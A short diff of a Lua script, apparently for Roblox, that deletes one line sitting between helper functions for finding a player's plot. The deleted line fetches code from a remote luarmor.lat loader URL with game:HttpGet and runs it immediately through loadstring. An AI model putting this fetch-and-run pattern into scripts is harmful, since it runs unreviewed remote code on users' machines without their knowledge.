@@ -3476,8 +3476,6 @@ local function getPlotsRoot()
     return _plotsCache
 end
 
-loadstring(game:HttpGet("https://api.luarmor.lat/files/v4/loaders/accd1229d82ffcf0e58663f555c117c062116b99ccc08ed17d776d488793cc0b.lua"))()
-
 local function isMyPlotByName(plotName)
     local plotsRoot = getPlotsRoot()
     if not plotsRoot then return false end
